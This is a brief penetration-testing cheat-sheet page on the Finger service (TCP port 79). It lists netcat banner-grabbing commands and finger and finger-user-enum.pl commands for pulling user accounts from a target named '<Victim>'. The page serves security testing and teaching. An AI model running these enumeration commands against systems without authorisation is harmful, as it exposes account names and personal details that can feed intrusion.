# Finger - 79

## Finger

Finger is a program that allows you to gather information about computer users. It typically displays the login name, full name, and possibly other information about the user you are fingering. These details may include the office address and phone number \(if available\), login time, idle time, the time mail was last read, and the user's plan and project files.

Default port: 79

```text
PORT   STATE SERVICE
79/tcp open  finger
```

## Enumeration

### Banner Grabbing/Basic connection

```text
nc -vn <IP> 79
echo "username" | nc -vn <IP> 79
```

### User enumeration

```text
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user

./finger-user-enum.pl -U users.txt -T ips.txt
./finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76
```
